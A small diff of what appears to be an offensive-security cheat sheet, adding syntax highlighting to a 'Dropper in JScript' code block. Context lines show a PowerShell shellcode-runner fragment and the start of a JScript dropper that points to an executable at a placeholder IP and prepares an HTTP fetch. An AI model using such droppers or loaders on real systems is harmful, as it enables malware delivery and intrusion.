@@ -1280,7 +1280,7 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 ```
 
 # Dropper in JScript
-```
+```javascript
 var url = "http://10.10.10.10/bin.exe"
 var Object = WScript.CreateObject('MSXML2.XMLHTTP');
 
